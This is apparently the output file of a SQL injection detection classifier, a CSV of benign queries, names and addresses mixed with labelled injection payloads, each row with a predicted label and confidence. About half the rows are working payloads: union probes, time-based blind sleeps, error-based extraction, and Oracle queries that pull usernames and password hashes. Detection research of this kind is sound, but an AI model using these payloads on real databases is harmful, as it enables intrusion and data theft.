text,true_label,predicted_label,confidence_sql_injection
select * from basic where please between '1996-07-01' and '1996-07-31',0,0,0.0
"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
or 'a'  =  'a,1,1,0.99
cedric,0,0,0.004468253314358248
" select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1,1,1.0
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1,1,1.0
select top 3 * from minerals where nails = 'direction',0,0,0.0
" end and    (    (   ""kvts"" like ""kvts",1,1,1.0
"1   )    )     )   union all select null,null,null,null,null--",1,1,1.0
select min ( handsome )  as gray from food,0,0,0.0
"c/ antonia lancha, 38, 1?h",0,0,0.06
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1,1,1.0
sim5e469,0,0,0.004468253314358248
select avg ( moment ) from plant select sum ( shake ) ,0,0,0.0
select * from feed where decide = 'promised' fetch first 3 rows only,0,0,0.0
"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from  ( select beginning from gold ) ,0,0,0.0
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
from  ( select distinct bend from village ) ,0,0,0.0
1'||  (  select 'rdqv' from dual where 1894  =  1894,1,1,1.0
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1,1,1.0
"rua bamio, 190 11?h",0,0,0.0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1,1,1.0
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw,1,1,1.0
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1,1,1.0
select * from bank  where riding not like '[chair]%',0,0,0.0
select * from zulu where respect like '%death%',0,0,0.0
select top 50 percent * from phrase select * from loud fetch first 50 percent rows onlyselect top 3 * from able,0,0,0.0
select * from orderswhere orderdate between '1996-07-01' and '1996-07-31';,0,0,0.02
nuez de balboa 131 2-f,0,0,0.0
select * from deep fetch first 3 rows only,0,0,0.0
rascel-byatt@discotecateatre.ug,0,0,0.006527024015406931
select shorter from long union all select move from easily order by party,0,0,0.0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
"   select here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect as count  from leaf",0,0,0.01
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",1,1,1.0
1 rlike sleep  (  5  ) ,1,1,0.98
select * from mass where not little = 'harder'  and not share = 'automobile',0,0,0.0
select * from chose,0,0,0.0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1,1,1.0
"   select cause,may,yesterday,cookies,fill     (  (  upper join common on tide.facing =  brain.object )   inner join blowon orders.notice =  inch.sangid ) ",0,0,0.0
"c/ bailen 8,",0,0,0.0
sorts bransuel,0,0,0.004468253314358248
"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1,1,0.99
select top 50 percent * from his,0,0,0.0
insert,1,0,0.004038575161930648
senderow,0,0,0.004468253314358248
"  select worker as cabin, broad as [torn]  from breathe",0,0,0.0
"  select orders.hiddenrid, employees.bone, employees.safe from ordersright join employees on orders.employeeid  =  employees.planid order by orders.frequentlyid",0,0,0.0
wildt_feng-chiao@paseotuperro.ke,0,0,0.006527024015406931
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'  =  'fbnx",1,1,1.0
1'+  (  select 'feof' where 1966  =  1966,1,1,1.0
select * from particular where television = 'say' limit 3,0,0,0.0
2813,0,0,0.004468253314358248
select min ( piano )  as voyage from experiment,0,0,0.0
"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",1,1,1.0
6310,0,0,0.004468253314358248
select guide ( s )  from baseball select war ( s ) ,0,0,0.0
select * from chart fetch first 3 rows only select top 50 percent * from should,0,0,0.0
almoharn,0,0,0.004468253314358248
select * from scientific where stage like '%happy%',0,0,0.0
select top 3 * from replied where fill = 'ordinary',0,0,0.0
ozoa cadaveira,0,0,0.004468253314358248
select count ( distinct environment )  from metal,0,0,0.0
"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",1,1,1.0
seno,0,0,0.004468253314358248
select * from kill fetch first 3 rows only select top 50 percent * from smooth,0,0,0.0
select * from dance order by dark,0,0,0.0
select * from kill fetch first 3 rows only,0,0,0.0
select count ( just )  from shoe,0,0,0.0
bic9spide,0,0,0.004468253314358248
select * from ill where biggest = 'nor',0,0,0.0
"-5672%"" or 3825  =  9675--",1,1,1.0
select top 3 * from danger where rocky = 'better',0,0,0.0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,1,1.0
"1""  )   where 4426  =  4426 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
" select * from users where id  =  1 +\. union select null,@@version -- 1",1,1,1.0
select * from grew where lion = 'diameter'  or attempt = 'broken',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 367845 )  order by meta_id asc",0,0,0.0
"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1,1,1.0
"  select situation as evidence, customs as [policeman]  from fight",0,0,0.0
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1,1,1.0
74,0,0,0.004468253314358248
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1,1,1.0
select top 3 * from result,0,0,0.0
coe,0,0,0.004468253314358248
select top 50 percent * from choice,0,0,0.0
select top 3 * from review,0,0,0.0
select * from fighting where worth = 'rock' limit 3,0,0,0.0
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",1,1,1.0
c/ marquesa de vilallonga 53 5f,0,0,0.0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1,1,1.0
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,0.99
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  4   )    )    and 'i'  =  'i",1,1,1.0
legrandv,0,0,0.004468253314358248
"1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select * from know where go = 'entirely',0,0,0.0
select * from rather 3 select * from prove,0,0,0.0
select * from butter where within between not09/01/1996border and birds15/31/1996vertical,0,0,0.0
retallac,0,0,0.004468253314358248
select * from prove,0,0,0.0
select * from  ( select hollow from actual ) ,0,0,0.0
-5500'  )   order by 1--,1,1,1.0
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select pupil ( s from root right join,0,0,0.0
select listen ( s )  from courage select eaten from his,0,0,0.0
select citizen ( s )  from news select distant from hall,0,0,0.0
28721,0,0,0.004468253314358248
"-5014%""   )    )     )   or 3348  =  2430--",1,1,1.0
select top 3 * from somehow,0,0,0.0
select laugh from angry,0,0,0.0
alises,0,0,0.004468253314358248
select * from idea where improve  between 10 and 20,0,0,0.0
from  ( select distinct string from excellent ) ,0,0,0.0
select min ( recent )  as bring from sense,0,0,0.0
select body ( s )  from statement full outer join,0,0,0.0
select count ( worryid ) from dog,0,0,0.0
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,1,1.0
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """,1,1,1.0
"c/ concepcion alexandre 82,",0,0,0.0
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1,1,1.0
38726,0,0,0.004468253314358248
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1,1,1.0
gaile,0,0,0.004468253314358248
"  select time_format ( ""19:30:10"", ""%r"" ) ;",0,0,0.03
san miguel del pino,0,0,0.0
"  select placeid as id, fix as held from early",0,0,0.0
"1%'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   '%'  =  '",1,1,1.0
select * from pot where bring not between 'crowd' and 'dry',0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  3   )    )    and 'i'  =  'i",1,1,1.0
mundy,0,0,0.004468253314358248
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"   select employees.oldest, count ( orders.wholeid )  as racefrom    ( ordersinner join close on orders.chanceid  =  employees.scaleid ) ",0,0,0.0
select * from rapidly where fairly not like 'stairs%',0,0,0.0
"1%'   )    )    union all select null,null,null,null,null,null,null#",1,1,1.0
"select * from exchange where best between ""taught"" and    ""involved""",0,0,0.0
"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1,1,0.99
"insert into pole  ( earn, eat, corner )  values  ( 'harder', 'sun', 'plus' )  ",0,0,0.0
"pl. finlandia, 58, 7?d",0,0,5.009392611145898e-05
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",1,1,1.0
"insert into example  ( count, from, nor )  values  ( 'blew', 'farm', 'silence' )  ",0,0,0.0
c632i6ela,0,0,0.004468253314358248
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 287 )  order by meta_id asc",0,0,0.0
tas9go,0,0,0.004468253314358248
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,1,1.0
" select * from buffalo order by lost asc, if desc",0,0,0.0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,1,1,1.0
select * from wp_posts where id  =  347682 limit 1,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 30710 )  order by meta_id asc",0,0,0.0
arrazua-ubarrundia,0,0,0.006527024015406931
777t1c4rio,0,0,0.004468253314358248
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  7   )    )    and 'i'  =  'i",1,1,1.0
select distinct grain from child,0,0,0.0
"-9854%""   )    )     )   or 6455  =  3652",1,1,1.0
"   select count ( triangle ) , again from fruit by large",0,0,0.0
"  select trace as scientist, bus as [rod]  from bush",0,0,0.0
select avg ( price ) from products;,0,0,0.0
"puerta del sol 124, 8?h",0,0,0.0
"1"" where 2394  =  2394 and 8831  =  8333--",1,1,1.0
select * from select  where to = current,0,0,0.01
"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
com/is?-wzx-uhylezkniylvabkl3w4oh5f749nr2kumffjzou  <email_address>  <![cdata[elwoodbuckley@freenet,0,0,0.01012212631001442
inoportunamente,0,0,0.004468253314358248
select fine ( s )  from secret select sea from nails,0,0,0.0
select avg ( funny ) from early select sum ( monkey ) ,0,0,0.0
eyre9@ringringcargo.tn,0,0,0.004468253314358248
23550240b,0,0,0.004468253314358248
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,1,1,1.0
"  select richid as id, influence as rear from now",0,0,0.0
melosa,0,0,0.004468253314358248
7.50908e+15,0,0,0.0
select ceiling ( 25.75 ) ;,0,0,0.0
select avg ( attack ) from over,0,0,0.0
select * from building where shallow = 'aloud' fetch first 3 rows only,0,0,0.0
select * from dark where physical between '1996-07-01' and '1996-07-31',0,0,0.0
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,1,1,1.0
"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
"-2718""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""kbvd"" like ""kbvd",1,1,1.0
9.0515e+15,0,0,0.0
select distinct talk from unhappy,0,0,0.0
select count ( distinct kitchen )  from tired,0,0,0.0
select count ( distinct six )  from enemy,0,0,0.0
-5854   )    )     )   union all select 5645#,1,1,1.0
" select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",1,1,1.0
select * from speed fetch first 50 percent rows only,0,0,0.0
pittman,0,0,0.004468253314358248
"select adddate ( ""2017-06-15"", interval -2 month ) ;",0,0,0.0
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1,1,0.99
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",1,1,1.0
select * from sail where have not between 'people' and 'form',0,0,0.0
18611,0,0,0.004468253314358248
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",1,1,1.0
select * from package where slip = 'dozen'  and city = 'palace',0,0,0.0
"-5150   )    )     )   union all select 5660,5660,5660#",1,1,1.0
"tres villas, las",0,0,0.004468253314358248
select * from simplest where amount between 'notice' and 'five',0,0,0.0
"   select employees.continent, count ( orders.parentid )  as settingfrom    ( ordersinner join more on orders.shadeid  =  employees.wheatid ) ",0,0,0.0
select * from weak where smaller not between 'unit' and 'dear',0,0,0.0
select * from copy where rough not like 'two%',0,0,0.0
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1,1,1.0
select characteristic ( s )  from hello,0,0,0.0
"   select warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly as ago  from attack",0,0,0.0
"1""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
" select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",1,1,1.0
select * from wp_posts left join wp_postmeta on  (  wp_posts.id  =  wp_postmeta.post_id  )  where  ( post_type  =  'page' and post_status  =  'publish' )  and wp_postmeta.meta_key  =  '_wp_page_template' and wp_postmeta.meta_value  =  'template/template-compare.php' order by wp_posts.post_title asc,0,0,0.05
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh",1,1,1.0
"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"   select force, game, island from helpful where pine  is null",0,0,0.0
select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,1,1,1.0
select count ( climate )  from attack,0,0,0.0
select * from composition where cookies not like 'useful%',0,0,0.0
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',1,1,1.0
 update exercise set arm = 'location'where stove = 'organized',0,0,0.0
select power ( s )  from correctly,0,0,0.0
select * from cream fetch first 50 percent rows only,0,0,0.0
select * from sale where forget = 'first',0,0,0.0
from  ( select distinct trunk from courage ) ,0,0,0.0
2639,0,0,0.004468253314358248
select avg ( last ) from tonight select sum ( make ) ,0,0,0.0
02879028a,0,0,0.004468253314358248
"   select count ( minute ) , office from mass by alive",0,0,0.0
"-9871""  )   union all select 9082#",1,1,1.0
select count ( impossibleid ) from belt,0,0,0.0
"calle sant joan, 123,",0,0,0.0
"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
10263,0,0,0.004468253314358248
select count ( my ) from wheel,0,0,0.0
abraham,0,0,0.004468253314358248
"-8797""   )    )    order by 1#",1,1,1.0
13421536r,0,0,0.004468253314358248
select * from people where desk like '%laid%',0,0,0.0
select * from group where figure = 'vapor' limit 3,0,0,0.0
karin,0,0,0.004468253314358248
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",1,1,1.0
perih1lio,0,0,0.004468253314358248
select distinct weather from discussion,0,0,0.0
1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,1,1,1.0
"   select uncle, studying, jumpfrom for where from  is not null",0,0,0.0
select * from keep  where attached = gate,0,0,0.0
 update block set village = 'pleasure'where knowledge = 'during',0,0,0.0
select avg ( price ) from chief,0,0,0.0
vicens,0,0,0.004468253314358248
ase,0,0,0.004468253314358248
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1,1,1.0
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,1,1,1.0
"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1,1,1.0
61882626e,0,0,0.004468253314358248
select avg ( price ) from seeing,0,0,0.0
"1%""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1,1,1.0
"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,1,1,1.0
6131,0,0,0.004468253314358248
1   )    )    as vmwj where 5597  =  5597,1,1,1.0
"   select cattle, post, sidesfrom breathing where tropical  is not null",0,0,0.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",1,1,1.0
niel5,0,0,0.004468253314358248
select avg ( clear )  from problem  select sum ( plane ) ,0,0,0.0
select * from mix where    not die = 'ask',0,0,0.0
1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,1,1,1.0
"1"" where 4281  =  4281",1,1,1.0
"1%""  )   and 8715  =  5529",1,1,1.0
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz",1,1,1.0
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
select top 50 percent * from walk select * from shelf fetch first 50 percent rows onlyselect top 3 * from proud,0,0,0.0
37159,0,0,0.004468253314358248
skylar,0,0,0.004468253314358248
select * from with where dress = 'band' limit 3,0,0,0.0
"1""  )   where 4112  =  4112",1,1,1.0
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,1,1,1.0
"1%"" or sleep  (  5  )  #",1,1,1.0
select avg ( truck ) from space,0,0,0.0
select avg ( either ) from result select sum ( slipped ) ,0,0,0.0
sleep 50',1,0,0.3603693283718226
"  select str_to_date ( ""august,5,2017"", ""%m %e %y"" ) ;",0,0,0.07
select clearly ( s )  from massage select double ( s ) ,0,0,0.0
" select column_name ( s )  from pound,bet",0,0,0.0
"   select employees.familiar, count ( orders.grainid )  as tapefrom    ( ordersinner join introduced on orders.youthid  =  employees.fingerid ) ",0,0,0.0
select * from dollar where appropriate between '1996-07-01' and '1996-07-31',0,0,0.0
select min ( spell )  as paid from essential,0,0,0.0
manganear,0,0,0.004468253314358248
select avg ( thee ) from language select sum ( friend ) ,0,0,0.0
open3,0,0,0.004468253314358248
sureda bahamonde,0,0,0.004468253314358248
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1,1,1.0
"  select higherid as id, wagon as tree from seven",0,0,0.0
select avg ( chance ) from happily select sum ( blanket ) ,0,0,0.0
60613075w,0,0,0.004468253314358248
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1,1,1.0
"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"insert into increase ( company, college, introduced, rain, metal, mood )  values  ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )  ",0,0,0.0
select * from solar where known between 'declared' and 'nothing',0,0,0.0
nagyszeder.kehoe@creacionesacampada.es,0,0,0.004468253314358248
select * from for  where angry = answer,0,0,0.0
ellacott2,0,0,0.004468253314358248
select * from can where not brief = 'desk'  and not method = 'its',0,0,0.0
aguacella,0,0,0.004468253314358248
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,1.0
select count ( * )  as adult,0,0,0.0
select * from age order by thumb,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,1,0.99
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1,1,1.0
granyena de segarra,0,0,0.0
17590r,0,0,0.004468253314358248
" select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1,1,1.0
select * from adjective where price not between 10 and 20,0,0,0.0
-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,1,1,1.0
"1%'   )    )    union all select null,null,null#",1,1,1.0
select curtime (  ) ;,0,0,0.0
calle soria 154 2a,0,0,0.0
schucrenberg-oheaney3@testdevelcidad.info,0,0,0.006527024015406931
